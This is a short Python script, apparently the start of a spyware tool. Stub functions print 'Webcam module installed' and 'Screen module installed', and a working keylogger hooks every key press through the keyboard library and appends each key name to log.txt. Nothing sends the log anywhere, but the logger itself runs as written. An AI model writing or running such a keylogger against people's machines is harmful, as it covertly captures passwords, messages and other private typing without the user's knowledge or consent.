import keyboard

def webcam():
    print("Webcam module installed")

def screenShot():
    print("Screen module installed")

def keylogger(event):
    logFile = "log.txt"
    with open(logFile, "a") as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(keylogger)
keyboard.wait()
